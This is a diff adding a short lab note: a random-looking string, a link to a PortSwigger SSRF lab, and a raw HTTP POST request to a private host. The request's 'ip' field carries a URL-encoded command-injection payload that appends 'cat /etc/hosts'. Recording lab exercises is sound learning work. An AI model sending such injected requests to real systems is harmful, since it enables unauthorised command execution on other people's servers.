@@ -1,0 +1,14 @@
+KD#}M!9WNw8=z8);3L{69'4F4R2tj~Y.
+
+https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
+
+POST / HTTP/1.1
+Host: 10.10.11.10
+Content-Length: 33
+Origin: http://10.10.11.10
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+
+ip=localhost%3Bcat+%2Fetc%2Fhosts
+
